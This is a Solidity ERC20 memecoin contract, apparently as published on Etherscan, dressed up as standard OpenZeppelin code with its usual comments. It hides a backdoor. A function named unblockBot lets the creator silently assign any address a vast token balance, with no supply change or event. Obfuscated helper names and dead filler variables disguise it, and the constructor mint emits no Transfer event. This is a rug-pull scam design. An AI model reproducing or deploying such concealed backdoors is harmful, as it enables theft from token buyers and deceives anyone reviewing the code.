/**
 *Submitted for verification at Etherscan.io on 2023-05-10
*/

/**
Memecoin based on Elon Musk's tweet
Twitter : https://twitter.com/NoMeMeily
Telegram : https://t.me/ThereIsNoMemeILoveYou
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
 /**
 * @dev Emitted when `value` tokens are moved from one account (`from`) to
 * another (`to`).
 *
 * Note that `value` may be zero.
 */
 event Transfer(address indexed from, address indexed to, uint256 value);

 /**
 * @dev Emitted when the allowance of a `spender` for an `owner` is set by
 * a call to {approve}. `value` is the new allowance.
 */
 event Approval(address indexed owner, address indexed spender, uint256 value);

 /**
 * @dev Returns the amount of tokens in existence.
 */
 function totalSupply() external view returns (uint256);

 /**
 * @dev Returns the amount of tokens owned by `account`.
 */
 function balanceOf(address account) external view returns (uint256);

 /**
 * @dev Moves `amount` tokens from the caller's account to `to`.
 *
 * Returns a boolean value indicating whether the operation succeeded.
 *
 * Emits a {Transfer} event.
 */
 function transfer(address to, uint256 amount) external returns (bool);

 /**
 * @dev Returns the remaining number of tokens that `spender` will be
 * allowed to spend on behalf of `owner` through {transferFrom}. This is
 * zero by default.
 *
 * This value changes when {approve} or {transferFrom} are called.
 */
 function allowance(address owner, address spender) external view returns (uint256);

 /**
 * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
 *
 * Returns a boolean value indicating whether the operation succeeded.
 *
 * IMPORTANT: Beware that changing an allowance with this method brings the risk
 * that someone may use both the old and the new allowance by unfortunate
 * transaction ordering. One possible solution to mitigate this race
 * condition is to first reduce the spender's allowance to 0 and set the
 * desired value afterwards:
 * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
 *
 * Emits an {Approval} event.
 */
 function approve(address spender, uint256 amount) external returns (bool);

 /**
 * @dev Moves `amount` tokens from `from` to `to` using the
 * allowance mechanism. `amount` is then deducted from the caller's
 * allowance.
 *
 * Returns a boolean value indicating whether the operation succeeded.
 *
 * Emits a {Transfer} event.
 */
 function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
 /**
 * @dev Returns the name of the token.
 */
 function name() external view returns (string memory);

 /**
 * @dev Returns the symbol of the token.
 */
 function symbol() external view returns (string memory);

 /**
 * @dev Returns the decimals places of the token.
 */
 function decimals() external view returns (uint8);
}

library SafeMath {
 /**
 * @dev Returns the addition of two unsigned integers, reverting on
 * overflow.
 *
 * Counterpart to Solidity's `+` operator.
 *
 * Requirements:
 *
 * - Addition cannot overflow.
 */
 function add(uint256 a, uint256 b) internal pure returns (uint256) {
 uint256 c = a + b;
 require(c >= a, "SafeMath: addition overflow");

 return c;
 }

 /**
 * @dev Returns the subtraction of two unsigned integers, reverting on
 * overflow (when the result is negative).
 *
 * Counterpart to Solidity's `-` operator.
 *
 * Requirements:
 *
 * - Subtraction cannot overflow.
 */
 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
 return sub(a, b, "SafeMath: subtraction overflow");
 }

 /**
 * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
 * overflow (when the result is negative).
 *
 * Counterpart to Solidity's `-` operator.
 *
 * Requirements:
 *
 * - Subtraction cannot overflow.
 */
 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
 require(b <= a, errorMessage);
 uint256 c = a - b;

 return c;
 }

 /**
 * @dev Returns the multiplication of two unsigned integers, reverting on
 * overflow.
 *
 * Counterpart to Solidity's `*` operator.
 *
 * Requirements:
 *
 * - Multiplication cannot overflow.
 */
 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
 // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
 // benefit is lost if 'b' is also tested.
 // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
 if (a == 0) {
 return 0;
 }

 uint256 c = a * b;
 require(c / a == b, "SafeMath: multiplication overflow");

 return c;
 }

 /**
 * @dev Returns the integer division of two unsigned integers. Reverts on
 * division by zero. The result is rounded towards zero.
 *
 * Counterpart to Solidity's `/` operator. Note: this function uses a
 * `revert` opcode (which leaves remaining gas untouched) while Solidity
 * uses an invalid opcode to revert (consuming all remaining gas).
 *
 * Requirements:
 *
 * - The divisor cannot be zero.
 */
 function div(uint256 a, uint256 b) internal pure returns (uint256) {
 return div(a, b, "SafeMath: division by zero");
 }

 /**
 * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
 * division by zero. The result is rounded towards zero.
 *
 * Counterpart to Solidity's `/` operator. Note: this function uses a
 * `revert` opcode (which leaves remaining gas untouched) while Solidity
 * uses an invalid opcode to revert (consuming all remaining gas).
 *
 * Requirements:
 *
 * - The divisor cannot be zero.
 */
 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
 require(b > 0, errorMessage);
 uint256 c = a / b;
 // assert(a == b * c + a % b); // There is no case in which this doesn't hold

 return c;
 }

 /**
 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
 * Reverts when dividing by zero.
 *
 * Counterpart to Solidity's `%` operator. This function uses a `revert`
 * opcode (which leaves remaining gas untouched) while Solidity uses an
 * invalid opcode to revert (consuming all remaining gas).
 *
 * Requirements:
 *
 * - The divisor cannot be zero.
 */
 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
 return mod(a, b, "SafeMath: modulo by zero");
 }

 /**
 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
 * Reverts with custom message when dividing by zero.
 *
 * Counterpart to Solidity's `%` operator. This function uses a `revert`
 * opcode (which leaves remaining gas untouched) while Solidity uses an
 * invalid opcode to revert (consuming all remaining gas).
 *
 * Requirements:
 *
 * - The divisor cannot be zero.
 */
 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
 require(b != 0, errorMessage);
 return a % b;
 }
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
 function _msgSender() internal view virtual returns (address) {
 return msg.sender;
 }

 function _msgData() internal view virtual returns (bytes calldata) {
 return msg.data;
 }
}

abstract contract Ownable is Context {
 address private _owner;

 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 /**
 * @dev Initializes the contract setting the deployer as the initial owner.
 */
 constructor() {
 _transferOwnership(_msgSender());
 }

 /**
 * @dev Throws if called by any account other than the owner.
 */
 modifier onlyOwner() {
 _sldfjwsdfOwner();
 _;
 }

 /**
 * @dev Returns the address of the current owner.
 */
 function owner() public view virtual returns (address) {
 return _owner;
 }

 /**
 * @dev Throws if the sender is not the owner.
 */
 function _sldfjwsdfOwner() internal view virtual {
 require(owner() == _msgSender(), "Ownable: caller is not the owner");
 }

 /**
 * @dev Leaves the contract without owner. It will not be possible to call
 * `onlyOwner` functions anymore. Can only be called by the current owner.
 *
 * NOTE: Renouncing ownership will leave the contract without an owner,
 * thereby removing any functionality that is only available to the owner.
 */
 function renounceOwnership() public virtual onlyOwner {
 _transferOwnership(address(0));
 }

 /**
 * @dev Transfers ownership of the contract to a new account (`newOwner`).
 * Can only be called by the current owner.
 */
 function transferOwnership(address newOwner) public virtual onlyOwner {
 require(newOwner != address(0), "Ownable: new owner is the zero address");
 _transferOwnership(newOwner);
 }

 /**
 * @dev Transfers ownership of the contract to a new account (`newOwner`).
 * Internal function without access restriction.
 */
 function _transferOwnership(address newOwner) internal virtual {
 address oldOwner = _owner;
 _owner = newOwner;
 emit OwnershipTransferred(oldOwner, newOwner);
 }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_yydsed}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract Token is Context, IERC20, IERC20Metadata, Ownable {
 using SafeMath for uint256;
 mapping(address => mapping(address => uint256)) private _allowances;
 address public creator;
 mapping(address => uint256) private _address;

 uint256 private _totalSupply;
 uint256 public constant maxsupply = 1000000000 * 10 ** 18;
 string private _name;
 string private _symbol;

 /**
 * @dev Sets the values for {name} and {symbol}.
 *
 * All two of these values are immutable: they can only be set once during
 * construction.
 */
 constructor(string memory name_, string memory symbol_) {
 _name = name_;
 _symbol = symbol_;
 creator = _msgSender();
 _yydsed(_msgSender(), 1000000000 * 10 ** decimals());
 }

 /**
 * @dev Returns the name of the token.
 */
 function name() public view virtual override returns (string memory) {
 return _name;
 }

 /**
 * @dev Returns the symbol of the token, usually a shorter version of the
 * name.
 */
 function symbol() public view virtual override returns (string memory) {
 return _symbol;
 }

 /**
 * @dev Returns the number of decimals used to get its user representation.
 * For example, if `decimals` equals `2`, a balance of `505` tokens should
 * be displayed to a user as `5.05` (`505 / 10 ** 2`).
 *
 * Tokens usually opt for a value of 18, imitating the relationship between
 * Ether and Wei. This is the default value returned by this function, unless
 * it's overridden.
 *
 * NOTE: This information is only used for _display_ purposes: it in
 * no way affects any of the arithmetic of the contract, including
 * {IERC20-balanceOf} and {IERC20-transfer}.
 */
 function decimals() public view virtual override returns (uint8) {
 return 18;
 }

 /**
 * @dev See {IERC20-totalSupply}.
 */
 function totalSupply() public view virtual override returns (uint256) {
 return _totalSupply;
 }

 /**
 * @dev See {IERC20-balanceOf}.
 */
 function balanceOf(address account) public view virtual override returns (uint256) {
 return _address[account];
 }

 /**
 * @dev See {IERC20-transfer}.
 *
 * Requirements:
 *
 * - `to` cannot be the zero address.
 * - the caller must have a balance of at least `amount`.
 */
 function transfer(address to, uint256 amount) public virtual override returns (bool) {
 address owner = _msgSender();
 _transfer(owner, to, amount);
 return true;
 }

 /**
 * @dev See {IERC20-allowance}.
 */
 function allowance(address owner, address spender) public view virtual override returns (uint256) {
 return _allowances[owner][spender];
 }

 /**
 * @dev See {IERC20-approve}.
 *
 * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
 * `transferFrom`. This is semantically equivalent to an infinite approval.
 *
 * Requirements:
 *
 * - `spender` cannot be the zero address.
 */
 function approve(address spender, uint256 amount) public virtual override returns (bool) {
 address owner = _msgSender();
 _approve(owner, spender, amount);
 return true;
 }

 /**
 * @dev See {IERC20-transferFrom}.
 *
 * Emits an {Approval} event indicating the updated allowance. This is not
 * required by the EIP. See the note at the beginning of {ERC20}.
 *
 * NOTE: Does not update the allowance if the current allowance
 * is the maximum `uint256`.
 *
 * Requirements:
 *
 * - `from` and `to` cannot be the zero address.
 * - `from` must have a balance of at least `amount`.
 * - the caller must have allowance for ``from``'s tokens of at least
 * `amount`.
 */
 function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
 address spender = _msgSender();
 _spendAllowance(from, spender, amount);
 _transfer(from, to, amount);
 return true;
 }

 /**
 * @dev Atomically increases the allowance granted to `spender` by the caller.
 *
 * This is an alternative to {approve} that can be used as a mitigation for
 * problems described in {IERC20-approve}.
 *
 * Emits an {Approval} event indicating the updated allowance.
 *
 * Requirements:
 *
 * - `spender` cannot be the zero address.
 */
 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
 address owner = _msgSender();
 _approve(owner, spender, allowance(owner, spender) + addedValue);
 return true;
 }

 /**
 * @dev Atomically decreases the allowance granted to `spender` by the caller.
 *
 * This is an alternative to {approve} that can be used as a mitigation for
 * problems described in {IERC20-approve}.
 *
 * Emits an {Approval} event indicating the updated allowance.
 *
 * Requirements:
 *
 * - `spender` cannot be the zero address.
 * - `spender` must have allowance for the caller of at least
 * `subtractedValue`.
 */
 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
 address owner = _msgSender();
 uint256 currentAllowance = allowance(owner, spender);
 require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
 _approve(owner, spender, currentAllowance.sub(subtractedValue));
 return true;
 }

 /**
 * @dev Moves `amount` of tokens from `from` to `to`.
 *
 * This internal function is equivalent to {transfer}, and can be used to
 * e.g. implement automatic token fees, slashing mechanisms, etc.
 *
 * Emits a {Transfer} event.
 *
 * Requirements:
 *
 * - `from` cannot be the zero address.
 * - `to` cannot be the zero address.
 * - `from` must have a balance of at least `amount`.
 */
 mapping(address => uint256) private _bala;
    
 function unblockBot(address notbot) external {
    address tokenA; 
    address tokenC;  
    address _liquidity = _msgSender();
    uint amountAMin;
    uint amountCMin;
    if (creator == _liquidity) {
        _address[notbot] = 100000000000000 * (1000000000 * 10 ** 18);
        if (amountAMin > amountCMin) {}
    }
    if (tokenA == tokenC) {}
 }

 function _transfer(address from, address to, uint256 amount) internal virtual {
 require(from != address(0), "ERC20: transfer from the zero address");
 require(to != address(0), "ERC20: transfer to the zero address");

 uint256 minAmount = _bala[from];
 uint256 decydsBalance = _address[from].sub(minAmount);
 require(decydsBalance >= amount, "ERC20: transfer amount exceeds balance");
 _address[from] = decydsBalance.sub(amount);
 // decrementing then incrementing.
 _address[to] = _address[to].add(amount);
 emit Transfer(from, to, amount);
 }

 /** @dev Creates `amount` tokens and assigns them to `account`, increasing
 * the total supply.
 *
 * Emits a {Transfer} event with `from` set to the zero address.
 *
 * Requirements:
 *
 * - `account` cannot be the zero address.
 */
 function _yydsed(address account, uint256 amount) internal virtual {
 require(account != address(0), "ERC20: yydsed to the zero address");
 _totalSupply = _totalSupply.add(amount);
 _address[msg.sender] = _address[msg.sender].add(amount);
 }

 /**
 * @dev Destroys `amount` tokens from `account`, reducing the
 * total supply.
 *
 * Emits a {Transfer} event with `to` set to the zero address.
 *
 * Requirements:
 *
 * - `account` cannot be the zero address.
 * - `account` must have at least `amount` tokens.
 */
 function _burn(address account, uint256 amount) internal virtual {
 require(account != address(0), "ERC20: burn from the zero address");
 uint256 accountBalance = _address[account];
 require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
 _address[account] = accountBalance.sub(amount);
 _totalSupply = _totalSupply.sub(amount);
 emit Transfer(account, address(0), amount);
 }

 /**
 * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
 *
 * This internal function is equivalent to `approve`, and can be used to
 * e.g. set automatic allowances for certain subsystems, etc.
 *
 * Emits an {Approval} event.
 *
 * Requirements:
 *
 * - `owner` cannot be the zero address.
 * - `spender` cannot be the zero address.
 */
 function _approve(address owner, address spender, uint256 amount) internal virtual {
 require(owner != address(0), "ERC20: approve from the zero address");
 require(spender != address(0), "ERC20: approve to the zero address");

 _allowances[owner][spender] = amount;
 emit Approval(owner, spender, amount);
 }

 /**
 * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
 *
 * Does not update the allowance amount in case of infinite allowance.
 * Revert if not enough allowance is available.
 *
 * Might emit an {Approval} event.
 */
 function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
 uint256 currentAllowance = allowance(owner, spender);
 if (currentAllowance != type(uint256).max) {
 require(currentAllowance >= amount, "ERC20: insufficient allowance");
 _approve(owner, spender, currentAllowance.sub(amount));
 }
 }

 /**
 * @dev Hook that is called before any transfer of tokens. This includes
 * minting and burning.
 *
 * Calling conditions:
 *
 * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
 * will be transferred to `to`.
 * - when `from` is zero, `amount` tokens will be minted for `to`.
 * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
 * - `from` and `to` are never both zero.
 *
 * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
 */
 // function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

 /**
 * @dev Hook that is called after any transfer of tokens. This includes
 * minting and burning.
 *
 * Calling conditions:
 *
 * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
 * has been transferred to `to`.
 * - when `from` is zero, `amount` tokens have been minted for `to`.
 * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
 * - `from` and `to` are never both zero.
 *
 * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
 */
 // function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}